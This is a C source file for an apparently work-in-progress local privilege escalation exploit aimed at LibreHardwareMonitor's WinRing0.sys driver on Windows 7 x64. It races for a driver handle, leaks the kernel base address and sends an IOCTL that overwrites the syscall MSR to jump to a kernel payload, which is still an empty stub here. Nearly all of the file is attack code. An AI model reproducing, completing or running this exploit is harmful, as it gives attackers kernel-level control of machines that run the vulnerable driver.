#include "exploit.h"

// Work In Progress...
int main(int argc, char** argv)
{
	WRITEMSR_INPUT_STRUCTURE input;
	HANDLE h_driver = CreateFileA(TARGET_DEVICE, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
	unsigned long long nt_base_address = 0;
	unsigned long high_bits_address = 0, low_bits_address = 0, bytes_returned = 0;
	unsigned char unused = 0, output[2048];

	RtlSecureZeroMemory(&output, sizeof(output));
	RtlSecureZeroMemory(&input, sizeof(input));

	SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);

	SetConsoleTitleA("LibreHardwareMonitor WinRing0.sys Elevation of Privilege");

	printf("[*] LibreHardwareMonitor WinRing0.sys 'wrmsr' Instruction Elevation of Privilege Vulnerability\n[*] Tested successfully on Windows 7 SP1 Build 7601 x64\n[*] Exploit written by ExAllocatePool2\n[!] Let's exploit!\n[*] Racing to obtain a device driver handle...");

	while (h_driver == (HANDLE)-1)
	{
		h_driver = CreateFileA(TARGET_DEVICE, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
	}
	printf("\n[+] Obtained a handle to the vulnerable device driver. Handle Value: 0x%p", h_driver);

	nt_base_address = leak_ntoskrnl_base_address();
	if (!nt_base_address)
	{
		return 1;
	}

	high_bits_address = (nt_base_address & 0xFFFFFFFF00000000) >> 60;
	low_bits_address = (nt_base_address & 0xFFFFFFFF);
	input.Register = SYSCALL_MSR;
	input.Address = kernel_payload;

	printf("\n[+] Crafted the input structure.\n<---------------- | Entering Danger Zone | ---------------->\n[!] Triggering MSR overwrite and payload execution in 3...");
	for (int i = 2; i > 0; i--)
	{
		Sleep(1000);
		printf("\n[!] %d...", i);
	}
	Sleep(1000);

	DeviceIoControl(h_driver, IOCTL_WRITE_MSR, &input, sizeof(input), &output, sizeof(output), &bytes_returned, 0);

	printf("\n<---------------- | Leaving Danger Zone | ---------------->\n[+] Exploitation complete.\n[>] Press \"ENTER\" to exit...");
	unused = getchar();
	return 0;
}

void kernel_payload()
{
	return;
}